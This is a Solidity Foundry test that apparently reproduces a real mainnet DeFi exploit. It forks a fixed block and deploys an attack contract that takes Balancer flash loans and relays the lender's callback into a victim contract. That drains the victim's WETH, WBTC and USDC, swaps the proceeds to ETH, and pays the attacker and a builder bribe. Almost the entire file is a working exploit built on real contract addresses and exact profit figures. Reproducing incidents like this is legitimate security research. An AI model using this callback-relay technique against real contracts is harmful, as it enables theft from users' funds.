// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";

interface IERC20Like {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IWETHLike is IERC20Like {
    function withdraw(uint256 amount) external;
}

interface IBalancerVault {
    function flashLoan(address recipient, address[] calldata tokens, uint256[] calldata amounts, bytes calldata userData)
        external;
}

interface IBalancerFlashLoanRecipient {
    function receiveFlashLoan(
        address[] calldata tokens,
        uint256[] calldata amounts,
        uint256[] calldata feeAmounts,
        bytes calldata userData
    ) external;
}

interface IUniswapV2Router {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

contract ContractTest is BaseTestWithBalanceLog {
    address private constant ATTACKER = 0xe4B97Db5FAF476DB464Bc271097Fac97d6CE3783;
    uint256 private constant FORK_BLOCK = 23_006_171;
    uint256 private constant NET_ETH_PROFIT = 484_905_272_210_340_031;

    function setUp() public {
        vm.createSelectFork("mainnet", FORK_BLOCK);

        fundingToken = address(0);
        attacker = ATTACKER;

        vm.label(ATTACKER, "attacker");
    }

    function testExploit() public balanceLog {
        uint256 beforeBalance = ATTACKER.balance;

        vm.startPrank(ATTACKER);
        BalancerCallbackExploit exploit = new BalancerCallbackExploit(ATTACKER);
        exploit.execute();
        vm.stopPrank();

        assertEq(ATTACKER.balance - beforeBalance, NET_ETH_PROFIT, "ETH profit mismatch");
    }
}

contract BalancerCallbackExploit is IBalancerFlashLoanRecipient {
    address private constant VICTIM = 0x6704713B32CB1B3e89B0CF7D77417807061BdEB8;
    address private constant BRIBE_RECIPIENT = 0x4838B106FCe9647Bdf1E7877BF73cE8B0BAD5f97;

    IBalancerVault private constant BALANCER_VAULT = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IUniswapV2Router private constant UNISWAP_ROUTER = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    IWETHLike private constant WETH = IWETHLike(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20Like private constant WBTC = IERC20Like(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
    IERC20Like private constant USDC = IERC20Like(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

    uint256 private constant WETH_FLASH_AMOUNT = 473_522_669_684_430_856;
    uint256 private constant WBTC_FLASH_AMOUNT = 52_290;
    uint256 private constant USDC_FLASH_AMOUNT = 18_718_287;
    uint256 private constant GROSS_WETH_PROFIT = 494_905_272_210_340_031;
    uint256 private constant BRIBE_AMOUNT = 10_000_000_000_000_000;
    uint256 private constant NET_ETH_PROFIT = 484_905_272_210_340_031;

    address private immutable _recipient;

    constructor(address recipient) {
        _recipient = recipient;
    }

    function execute() external {
        _stealViaVictimCallback(address(WETH), WETH_FLASH_AMOUNT);
        _stealViaVictimCallback(address(WBTC), WBTC_FLASH_AMOUNT);
        _stealViaVictimCallback(address(USDC), USDC_FLASH_AMOUNT);

        _swapToWeth(address(WBTC), WBTC_FLASH_AMOUNT);
        _swapToWeth(address(USDC), USDC_FLASH_AMOUNT);

        uint256 wethBalance = WETH.balanceOf(address(this));
        require(wethBalance == GROSS_WETH_PROFIT, "unexpected WETH proceeds");
        WETH.withdraw(wethBalance);

        _sendEth(BRIBE_RECIPIENT, BRIBE_AMOUNT);
        _sendEth(_recipient, NET_ETH_PROFIT);
    }

    receive() external payable {}

    function receiveFlashLoan(
        address[] calldata tokens,
        uint256[] calldata amounts,
        uint256[] calldata feeAmounts,
        bytes calldata userData
    ) external override {
        require(msg.sender == address(BALANCER_VAULT), "unexpected lender");
        IBalancerFlashLoanRecipient(VICTIM).receiveFlashLoan(tokens, amounts, feeAmounts, userData);
    }

    function _stealViaVictimCallback(address token, uint256 amount) private {
        address[] memory tokens = new address[](1);
        tokens[0] = token;

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = amount;

        BALANCER_VAULT.flashLoan(address(this), tokens, amounts, "");
    }

    function _swapToWeth(address token, uint256 amount) private {
        IERC20Like(token).approve(address(UNISWAP_ROUTER), amount);

        address[] memory path = new address[](2);
        path[0] = token;
        path[1] = address(WETH);

        UNISWAP_ROUTER.swapExactTokensForTokens(amount, 0, path, address(this), block.timestamp);
    }

    function _sendEth(address to, uint256 amount) private {
        (bool success,) = payable(to).call{value: amount}("");
        require(success, "ETH transfer failed");
    }
}
